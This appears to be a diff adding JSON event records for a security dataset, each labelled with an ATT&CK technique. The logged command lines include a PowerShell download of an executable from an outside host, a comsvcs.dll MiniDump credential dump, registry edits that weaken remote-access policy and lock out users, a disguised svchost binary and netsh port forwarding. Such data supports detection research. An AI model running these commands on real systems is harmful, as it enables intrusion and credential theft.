+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655174408,
+    "label": "T1112_257313a3c93e3bb7dfb60d6753b09e34"
+}
+{
+    "srcNode": {
+        "UUID": "f6fd21b9-d583-5edd-8707-f42fd7c7b4fc",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 3476
+    },
+    "dstNode": {
+        "UUID": "2ae8cfba-e069-5692-82bd-53a06c368c41",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileMenu",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655174408,
+    "label": "T1112_257313a3c93e3bb7dfb60d6753b09e34"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "c9859e02-b3b7-5d14-b0ad-60d7d8d5790f",
+        "Name": "where.exe",
+        "Image": "C:\\Windows\\system32\\where.exe",
+        "Cmdline": "where  /R C:\\Users\\ places.sqlite",
+        "Type": "Process",
+        "Pid": 6556
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235896,
+    "label": "T1217_f7a0f7d704aa52a764d9d1bee81e65d6"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "a6ab1aa8-ee3c-52df-8b48-72729bd30f15",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe  /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f ",
+        "Type": "Process",
+        "Pid": 8936
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235948,
+    "label": "T1112_e7a987cbef27263e666e5b096488dc55"
+}
+{
+    "srcNode": {
+        "UUID": "a6ab1aa8-ee3c-52df-8b48-72729bd30f15",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe  /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f ",
+        "Type": "Process",
+        "Pid": 8936
+    },
+    "dstNode": {
+        "UUID": "35aa4e5c-8520-52a9-8329-eca48cb97d27",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f ",
+        "Type": "Process",
+        "Pid": 6768
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235950,
+    "label": "T1112_e7a987cbef27263e666e5b096488dc55"
+}
+{
+    "srcNode": {
+        "UUID": "a0804f67-ae62-5969-b058-dc8547ebe525",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe  /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f ",
+        "Type": "Process",
+        "Pid": 10872
+    },
+    "dstNode": {
+        "UUID": "a24cf45e-5308-54bf-9559-11d17aca2849",
+        "Key": "HKLM\\System\\CurrentControlSet\\Control\\FileSystem\\LongPathsEnabled",
+        "Type": "Registry",
+        "Value": "0"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655235952,
+    "label": "T1112_e7a987cbef27263e666e5b096488dc55"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "d500a4af-40e3-5f3b-b834-76b358e42245",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"ping db-99.weiss.org\"",
+        "Type": "Process",
+        "Pid": 5748
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235963,
+    "label": "T1016_921055f4-5970-4707-909e-62f594234d91"
+}
+{
+    "srcNode": {
+        "UUID": "d500a4af-40e3-5f3b-b834-76b358e42245",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"ping db-99.weiss.org\"",
+        "Type": "Process",
+        "Pid": 5748
+    },
+    "dstNode": {
+        "UUID": "387abe7e-7338-5a6f-a6f7-18bd7afea282",
+        "Name": "PING.EXE",
+        "Image": "C:\\Windows\\system32\\PING.EXE",
+        "Cmdline": "\"C:\\Windows\\system32\\PING.EXE\" db-99.weiss.org",
+        "Type": "Process",
+        "Pid": 364
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235965,
+    "label": "T1016_921055f4-5970-4707-909e-62f594234d91"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "069e8add-5673-5bea-9f9b-5301fcd35301",
+        "Name": "C:\\Windows\\System32\\cmd.exe",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655235972,
+    "label": "T1036.003_04e8d83e7badf098d50800d6aa1dd487"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "98d52bfc-f593-567b-97a2-1a460c9053b1",
+        "Name": "C:\\Users\\ezk\\AppData\\Local\\Temp\\svchost.exe",
+        "Type": "File"
+    },
+    "relation": "QueryDirectory",
+    "timestamp": 1655235972,
+    "label": "T1036.003_04e8d83e7badf098d50800d6aa1dd487"
+}
+{
+    "srcNode": {
+        "UUID": "23a5e9dd-7606-582c-917f-92fb1273e2e3",
+        "Name": "svchost.exe",
+        "Image": "C:\\Users\\ezk\\AppData\\Local\\Temp\\svchost.exe",
+        "Cmdline": "\"C:\\Users\\ezk\\AppData\\Local\\Temp\\svchost.exe\" ",
+        "Type": "Process",
+        "Pid": 4800
+    },
+    "dstNode": {
+        "UUID": "790e3e57-dcef-58cb-97db-0af955bd8797",
+        "Key": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-4065680934-2604657585-3199708412-1106\\\\Device\\HarddiskVolume3\\Users\\ezk\\AppData\\Local\\Temp\\svchost.exe",
+        "Type": "Registry",
+        "Value": "4D 74 F0 75 BF 4F D8 01 00 00 00 00 00 00 00 00"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655235982,
+    "label": "T1036.003_04e8d83e7badf098d50800d6aa1dd487"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "d0b8db78-acee-596e-872e-7cf9562af102",
+        "Srcaddress": "web-44.santiago.com",
+        "Dstaddress": "142.250.145.100",
+        "Port": "56948",
+        "Type": "Network"
+    },
+    "relation": "TCP Connect",
+    "timestamp": 1655236078,
+    "label": "T1491_68235976-2404-42a8-9105-68230cfef562"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "05789dc7-05b6-5904-b890-9a7b534cdf87",
+        "Name": "C:\\Users\\ezk\\AppData\\Local\\wallpaper.jpg",
+        "Type": "File"
+    },
+    "relation": "WriteFile",
+    "timestamp": 1655236078,
+    "label": "T1491_68235976-2404-42a8-9105-68230cfef562"
+}
+{
+    "srcNode": {
+        "UUID": "b70be8c4-069e-59b3-a753-87260622a2be",
+        "Name": "svehost",
+        "Image": "svehost.exe",
+        "Cmdline": "svehost.exe",
+        "Pid": 77509,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "05789dc7-05b6-5904-b890-9a7b534cdf87",
+        "Name": "C:\\Users\\ezk\\AppData\\Local\\wallpaper.jpg",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655236079,
+    "label": "T1491_68235976-2404-42a8-9105-68230cfef562"
+}
+{
+    "srcNode": {
+        "UUID": "e45ddf55-ff2b-503b-8b02-85563bda2e0d",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 85819,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f1d28cfa-c995-5cbb-a9ee-19de8b8df7d9",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\netsh.exe\" interface portproxy add v4tov4 listenport=27899 connectport=27899 connectaddress=127.0.0.1",
+        "Type": "Process",
+        "Pid": 5024
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181452,
+    "label": "T1090.001_ba343199a4f15ed6b57eb52412f62e4e"
+}
+{
+    "srcNode": {
+        "UUID": "f1d28cfa-c995-5cbb-a9ee-19de8b8df7d9",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\netsh.exe\" interface portproxy add v4tov4 listenport=27899 connectport=27899 connectaddress=127.0.0.1",
+        "Type": "Process",
+        "Pid": 5024
+    },
+    "dstNode": {
+        "UUID": "b55e85d4-394c-51de-a4cf-bf459de72ac4",
+        "Key": "HKLM\\System\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp\\*/27899",
+        "Type": "Registry",
+        "Value": "127.0.0.1/27899"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655181455,
+    "label": "T1090.001_ba343199a4f15ed6b57eb52412f62e4e"
+}
+{
+    "srcNode": {
+        "UUID": "e45ddf55-ff2b-503b-8b02-85563bda2e0d",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 85819,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ef0165b3-c664-5cb7-a709-69b268f76cac",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "netsh  advfirewall firewall show rule name=all",
+        "Type": "Process",
+        "Pid": 3896
+    },
+    "relation": "Process Create",
+    "timestamp": 1655181459,
+    "label": "T1016_71b3d2945679566b9d94d8cb11df4b70"
+}
+{
+    "srcNode": {
+        "UUID": "2ec62f62-c597-5350-ab75-8f61d6b2af23",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 14000,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "366c59c2-5613-5e7a-bdce-44c732ff12b3",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 4388
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174203,
+    "label": "T1112_cab7b85611a290c0769546bfa9d6f962"
+}
+{
+    "srcNode": {
+        "UUID": "366c59c2-5613-5e7a-bdce-44c732ff12b3",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 4388
+    },
+    "dstNode": {
+        "UUID": "4f3a67ef-e960-5a29-a437-1efb8da1ec81",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655174204,
+    "label": "T1112_cab7b85611a290c0769546bfa9d6f962"
+}
+{
+    "srcNode": {
+        "UUID": "366c59c2-5613-5e7a-bdce-44c732ff12b3",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 4388
+    },
+    "dstNode": {
+        "UUID": "4f3a67ef-e960-5a29-a437-1efb8da1ec81",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655174204,
+    "label": "T1112_cab7b85611a290c0769546bfa9d6f962"
+}
+{
+    "srcNode": {
+        "UUID": "2c76bc3c-6b4f-5278-af67-f063c48baaf5",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 60796,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "086fd23b-04a4-556a-959e-1394e2d61143",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object System.Net.WebClient).DownloadFile(\\\"http://arimeto.lv/Nm70oAfwB/CAY8NDwxeTEffCYaHHoWJ3hCfX9lemV+YXp/\\\", \\\"bjsdke.exe\\\")\"",
+        "Type": "Process",
+        "Pid": 8724
+    },
+    "relation": "Process Create",
+    "timestamp": 1655193670,
+    "label": "T1105_4f683658f161ccdc51337c470d32bab9"
+}
+{
+    "srcNode": {
+        "UUID": "086fd23b-04a4-556a-959e-1394e2d61143",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object System.Net.WebClient).DownloadFile(\\\"http://arimeto.lv/Nm70oAfwB/CAY8NDwxeTEffCYaHHoWJ3hCfX9lemV+YXp/\\\", \\\"bjsdke.exe\\\")\"",
+        "Type": "Process",
+        "Pid": 8724
+    },
+    "dstNode": {
+        "UUID": "2b6d7350-0307-51b5-99ed-633090b3ce82",
+        "Srcaddress": "desktop-78.perez-walker.net",
+        "Dstaddress": "65.8.46.47",
+        "Port": "2918",
+        "Type": "Network"
+    },
+    "relation": "TCP Receive",
+    "timestamp": 1655193671,
+    "label": "T1105_4f683658f161ccdc51337c470d32bab9"
+}
+{
+    "srcNode": {
+        "UUID": "086fd23b-04a4-556a-959e-1394e2d61143",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"(New-Object System.Net.WebClient).DownloadFile(\\\"http://arimeto.lv/Nm70oAfwB/CAY8NDwxeTEffCYaHHoWJ3hCfX9lemV+YXp/\\\", \\\"bjsdke.exe\\\")\"",
+        "Type": "Process",
+        "Pid": 8724
+    },
+    "dstNode": {
+        "UUID": "2b6d7350-0307-51b5-99ed-633090b3ce82",
+        "Srcaddress": "desktop-78.perez-walker.net",
+        "Dstaddress": "65.8.46.47",
+        "Port": "2918",
+        "Type": "Network"
+    },
+    "relation": "TCP Disconnect",
+    "timestamp": 1655193671,
+    "label": "T1105_4f683658f161ccdc51337c470d32bab9"
+}
+{
+    "srcNode": {
+        "UUID": "2c76bc3c-6b4f-5278-af67-f063c48baaf5",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 60796,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "480af6ac-1ccc-5b17-b603-8bd6ea7c4a1a",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 8532
+    },
+    "relation": "Process Create",
+    "timestamp": 1655193672,
+    "label": "T1112_fd992e8ecfdac9b56dd6868904044827"
+}
+{
+    "srcNode": {
+        "UUID": "480af6ac-1ccc-5b17-b603-8bd6ea7c4a1a",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 8532
+    },
+    "dstNode": {
+        "UUID": "edb9bed9-1bd5-584f-9c89-3dbbc1c65951",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655193673,
+    "label": "T1112_fd992e8ecfdac9b56dd6868904044827"
+}
+{
+    "srcNode": {
+        "UUID": "480af6ac-1ccc-5b17-b603-8bd6ea7c4a1a",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 8532
+    },
+    "dstNode": {
+        "UUID": "edb9bed9-1bd5-584f-9c89-3dbbc1c65951",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655193673,
+    "label": "T1112_fd992e8ecfdac9b56dd6868904044827"
+}
+{
+    "srcNode": {
+        "UUID": "2c76bc3c-6b4f-5278-af67-f063c48baaf5",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 60796,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f97bcb77-eb49-5a6a-8848-74629094de98",
+        "Name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655193674,
+    "label": "T1574.001_63bbedafba2f541552ac3579e9e3737b"
+}
+{
+    "srcNode": {
+        "UUID": "3b4034d2-76be-5330-b30d-5b8c3210ce0f",
+        "Name": "updater.exe",
+        "Image": "C:\\Users\\ezk\\AppData\\Roaming\\updater.exe",
+        "Cmdline": "C:\\Users\\ezk\\AppData\\Roaming\\updater.exe  -Command exit",
+        "Type": "Process",
+        "Pid": 612
+    },
+    "dstNode": {
+        "UUID": "c5f6f4e1-152d-5a23-aa49-228b7233f6f1",
+        "Name": "C:\\Users\\ezk\\AppData\\Roaming\\en-US\\updater.exe.mui",
+        "Type": "File"
+    },
+    "relation": "CreateFile",
+    "timestamp": 1655193675,
+    "label": "T1574.001_63bbedafba2f541552ac3579e9e3737b"
+}
+{
+    "srcNode": {
+        "UUID": "3b4034d2-76be-5330-b30d-5b8c3210ce0f",
+        "Name": "updater.exe",
+        "Image": "C:\\Users\\ezk\\AppData\\Roaming\\updater.exe",
+        "Cmdline": "C:\\Users\\ezk\\AppData\\Roaming\\updater.exe  -Command exit",
+        "Type": "Process",
+        "Pid": 612
+    },
+    "dstNode": {
+        "UUID": "3ae95309-627b-527d-9a52-cca21950621b",
+        "Key": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-4065680934-2604657585-3199708412-1106\\\\Device\\HarddiskVolume3\\Users\\ezk\\AppData\\Roaming\\updater.exe",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655193675,
+    "label": "T1574.001_63bbedafba2f541552ac3579e9e3737b"
+}
+{
+    "srcNode": {
+        "UUID": "2c76bc3c-6b4f-5278-af67-f063c48baaf5",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 60796,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "700da8fc-1a49-5213-88b5-ccdd0efbc5d1",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id Unconfirmed 296512.crdownload full\"",
+        "Type": "Process",
+        "Pid": 8276
+    },
+    "relation": "Process Create",
+    "timestamp": 1655193681,
+    "label": "T1003_18f31c311ac208802e88ab8d5af8603e"
+}
+{
+    "srcNode": {
+        "UUID": "0fd9a77a-6e54-5279-81b8-ab3eb1e64009",
+        "Name": "rundll32.exe",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 41836 Unconfirmed 296512.crdownload full",
+        "Type": "Process",
+        "Pid": 11120
+    },
+    "dstNode": {
+        "UUID": "efa544b8-c61f-57ef-858c-dabcc27d0cb7",
+        "Name": "Unconfirmed 296512.crdownload",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655193743,
+    "label": "T1003_18f31c311ac208802e88ab8d5af8603e"
+}
+{
+    "srcNode": {
+        "UUID": "0fd9a77a-6e54-5279-81b8-ab3eb1e64009",
+        "Name": "rundll32.exe",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 41836 Unconfirmed 296512.crdownload full",
+        "Type": "Process",
+        "Pid": 11120
+    },
+    "dstNode": {
+        "UUID": "efa544b8-c61f-57ef-858c-dabcc27d0cb7",
+        "Name": "Unconfirmed 296512.crdownload",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655193743,
+    "label": "T1003_18f31c311ac208802e88ab8d5af8603e"
+}
+{
+    "srcNode": {
+        "UUID": "d5088d78-2fee-5fb1-b11d-11db9d072efb",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 30863,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "bf71b239-f1f1-582e-bda2-7ca8797c66c0",
+        "Name": "nltest.exe",
+        "Image": "C:\\Windows\\system32\\nltest.exe",
+        "Cmdline": "nltest  /domain_trusts",
+        "Type": "Process",
+        "Pid": 11004
+    },
+    "relation": "Process Create",
+    "timestamp": 1655248348,
+    "label": "T1482_cfb61005899996469ae3023796792ca5"
+}
+{
+    "srcNode": {
+        "UUID": "d5088d78-2fee-5fb1-b11d-11db9d072efb",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 30863,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "30d3fd0c-a348-5e4d-962a-b38bfe78910c",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 10316
+    },
+    "relation": "Process Create",
+    "timestamp": 1655248361,
+    "label": "T1112_fa4ba6a06b4a5cd955ea5a60fae24281"
+}
+{
+    "srcNode": {
+        "UUID": "30d3fd0c-a348-5e4d-962a-b38bfe78910c",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 10316
+    },
+    "dstNode": {
+        "UUID": "d42dbd20-35b1-5760-8fbf-f9e44bc09472",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655248363,
+    "label": "T1112_fa4ba6a06b4a5cd955ea5a60fae24281"
+}
+{
+    "srcNode": {
+        "UUID": "30d3fd0c-a348-5e4d-962a-b38bfe78910c",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 10316
+    },
+    "dstNode": {
+        "UUID": "d42dbd20-35b1-5760-8fbf-f9e44bc09472",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655248363,
+    "label": "T1112_fa4ba6a06b4a5cd955ea5a60fae24281"
+}
+{
+    "srcNode": {
+        "UUID": "23596c3a-9a47-51d4-a92a-7451e0a0777e",
+        "Name": "24f089cd7b8348eea7f18b3d69fe7bd4d000f1a4c2ba7889a5e133e9862cc1e2",
+        "Image": "24f089cd7b8348eea7f18b3d69fe7bd4d000f1a4c2ba7889a5e133e9862cc1e2",
+        "Cmdline": "24f089cd7b8348eea7f18b3d69fe7bd4d000f1a4c2ba7889a5e133e9862cc1e2",
+        "Pid": 12784,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "c8f0fe15-dff4-50e4-8bb8-74cd40980949",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\cmd.exe\" /c \"netstat -ano\"",
+        "Type": "Process",
+        "Pid": 10716
+    },
+    "relation": "Process Create",
+    "timestamp": 1655177244,
+    "label": "T1059.001_55678719-e76e-4df9-92aa-10655bbd1cf4"
+}
+{
+    "srcNode": {
+        "UUID": "23596c3a-9a47-51d4-a92a-7451e0a0777e",
+        "Name": "24f089cd7b8348eea7f18b3d69fe7bd4d000f1a4c2ba7889a5e133e9862cc1e2",
+        "Image": "24f089cd7b8348eea7f18b3d69fe7bd4d000f1a4c2ba7889a5e133e9862cc1e2",
